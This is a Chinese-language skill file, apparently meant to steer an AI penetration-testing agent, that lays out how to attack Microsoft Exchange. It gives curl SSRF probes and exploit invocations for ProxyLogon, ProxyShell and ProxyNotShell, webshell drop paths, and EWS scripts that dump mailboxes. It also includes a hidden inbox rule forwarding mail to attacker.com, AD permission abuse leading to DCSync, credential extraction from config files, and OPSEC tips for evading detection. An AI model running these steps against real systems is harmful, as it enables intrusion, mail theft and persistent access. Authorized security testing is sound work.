---
name: exchange-attack
description: Exchange Server 攻击面：ProxyLogon / ProxyShell / ProxyNotShell 利用链、EWS 与 OWA 接口滥用、Exchange 凭据提取与邮件侧持久化
whenToUse: 目标外围暴露 OWA/ECP/EWS（/owa/、/ecp/、/autodiscover/），需要从邮件面进入内网
role: internal
enabled: true
---

# Exchange Server

> 邮件服务器通常在核心网段，一旦拿下等于跳到内网中心。

## 一、指纹与版本判定

```bash
curl -skI https://TARGET/owa/ | grep -iE "x-owa-version|x-feserver|server"
curl -sk https://TARGET/ecp/ -o /dev/null -w "%{http_code}\n"
curl -sk https://TARGET/autodiscover/autodiscover.xml -o /dev/null -w "%{http_code}\n"
curl -sk https://TARGET/mapi/nspi/ -o /dev/null -w "%{http_code}\n"
```

`X-OWA-Version: 15.1.2308.14` → 对应 CU 版本，查下表：

| 版本号段 | 对应 | 受影响 CVE |
|---|---|---|
| 15.0.x | Exchange 2013 | ProxyLogon、ProxyShell |
| 15.1.x < 15.1.2308 | Exchange 2016/2019 | ProxyShell、ProxyNotShell |
| 15.2.x < 15.2.1118 | Exchange 2019 CU12 前 | ProxyNotShell |

## 二、ProxyLogon（CVE-2021-26855 等四件套）

预认证 SSRF → 写文件 → RCE。

```bash
# 1. 验证 SSRF（最关键的一步）
curl -sk "https://TARGET/ecp/y.js" \
  -H "Cookie: X-BEResource=localhost~1942062522" \
  -o /dev/null -w "%{http_code}\n"
# 500 = 有 SSRF 面；404 = 已修补
```

```bash
# 完整利用（公开 PoC 结构）
python3 proxylogon.py TARGET user@domain.com
# 或 metasploit
msf > use exploit/windows/http/exchange_proxylogon_rce
```

## 三、ProxyShell（CVE-2021-34473 / 34523 / 31207）

三段链：SSRF 绕认证 → 拿特权 token → 写 webshell。

```bash
# 1. 自动发现邮箱（无需认证）
curl -sk "https://TARGET/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com" \
  -o /dev/null -w "%{http_code}\n"

# 2. 完整链（公开 PoC）
python3 proxyshell.py -u https://TARGET -e user@domain.com

# 3. metasploit
msf > use exploit/windows/http/exchange_proxyshell_rce
```

写 shell 落点通常：

```
C:\inetpub\wwwroot\aspnet_client\<random>.aspx
```

## 四、ProxyNotShell（CVE-2022-41040 / 41082）

```bash
# 1. 验证 SSRF（@ 绕过）
curl -sk "https://TARGET/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@foo.com" \
  -o /dev/null -w "%{http_code}\n"

# 2. 完整链需要 PowerShell 远程会话（RCE 部分依赖凭据）
```

判定：第一步返回 200 且 body 含 `Exchange` 相关 XML = SSRF 成立。RCE 部分需已拿到任意邮箱凭据。

## 五、EWS / OWA 接口滥用（有凭据之后）

```bash
# 1. 枚举邮箱（EWS FindItem）
python3 ews-find.py -u user@domain -p 'pass' -s https://TARGET/EWS/Exchange.asmx

# 2. 导出全部邮件（含附件）
python3 ews-export.py --url https://TARGET/EWS/Exchange.asmx --user user --password pass

# 3. 委派权限（拿到他人邮箱）
python3 ews-delegate.py -u user -p pass -t target@domain -s https://TARGET/EWS/Exchange.asmx
```

## 六、Exchange 侧持久化（授权靶标才做）

| 手段 | 落点 | 检测 |
|---|---|---|
| 收件箱规则 | OWA → 规则 → 转发到外部 | 事件 1009/1010 |
| 传输规则 | ECP → 邮件流 → 规则 | 事件 4001 |
| 委派访问 | 邮箱 → 委派 | 事件 1040 |
| EWS 应用 impersonation | RBAC 角色 | 事件 1000 |

```powershell
# 收件箱规则（隐蔽转发）
New-InboxRule -Name "Sync" -SubjectContainsWords "invoice" `
  -ForwardTo "external@attacker.com" -DeleteMessage $true
```

## 七、拿到 Exchange 机器权限之后

```cmd
:: 1. Exchange 通常有对 AD 的高权限（Exchange Windows Permissions）
whoami /groups | findstr -i "Exchange"

:: 2. 提权：写 ACL 到域对象
powershell -c "Add-ADPermission -Identity 'DC=target,DC=local' -User 'attacker' -ExtendedRights 'DS-Replication-Get-Changes-All'"
:: 然后 DCSync

:: 3. 从 Exchange 配置提取凭据
type "C:\Program Files\Microsoft\Exchange Server\V15\Bin\EdgeTransport.exe.config"
```

## 八、OPSEC

- ProxyLogon/ProxyShell 会写 `C:\inetpub\wwwroot\aspnet_client\`，**用完必须删**
- ECP 操作触发 4624 + Exchange 审计日志
- 不批量导出全公司邮箱——只导目标范围，且打码落盘
- EWS 请求频率 > 10/s 会触发限流（HTTP 503）

## 九、判定纪律

| 现象 | 判定 |
|---|---|
| `/owa/` 返回 200 | 只是识别，不是漏洞 |
| SSRF 探测返回 500 | 可能是 SSRF 面，需构造完整包验证 |
| 能写 aspx 但访问 404 | 落点错，检查 `aspnet_client` 路径 |
| 有 EWS 凭据能读自己邮箱 | 正常功能，不是漏洞 |
| 能读**他人**邮箱 | IDOR / 权限缺陷，成立 |

**只报实测读到非本人数据的路径。**
